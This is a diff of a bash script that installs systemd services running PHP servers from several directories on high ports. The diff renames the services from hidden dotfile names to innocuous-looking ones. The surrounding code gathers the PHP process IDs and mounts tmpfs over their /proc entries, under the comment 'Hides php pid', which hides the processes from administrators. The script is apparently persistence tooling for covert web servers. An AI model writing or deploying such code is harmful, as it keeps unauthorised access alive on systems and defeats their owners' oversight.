@@ -3,6 +3,7 @@
 # Declare variables
 declare -a directories=("/var/www/" "/home/" "/var/www/website1" "/tmp/")
 declare -a ports=(7777 8888 9999 11111)
+declare -a service_names=("test-1" "big-test-2" "tester-service-3" "web-4")
 source_dir="$(readlink -m $(dirname $0))"
 service_dir="/etc/systemd/system"
 
@@ -56,8 +57,8 @@ for i in "${!directories[@]}"; do
     # Assign variables
     dir="${directories[$i]}"
     port=${ports[$i]}
-    service_name=".php-server-website$i.service"
-    service_file="$service_dir/$service_name"
+    service_name="${service_names[$i]}"
+    service_file="$service_dir/$service_name.service"
 
     # Make sure directory exists
     mkdir -p "$dir"
@@ -92,10 +93,10 @@ EOF
     cd /
 done
 
-#Gets current php pid
+# Gets current php pid
 ps aux | awk '/[/]usr[/]bin[/]php/ {print $2}' > /tmp/.systemdprocs
 
-#Hides php pid
+# Hides php pid
 for pid in $(cat /tmp/.systemdprocs); do mount -t tmpfs none /proc/"$pid"; done
 
 # Wait for processes to finish
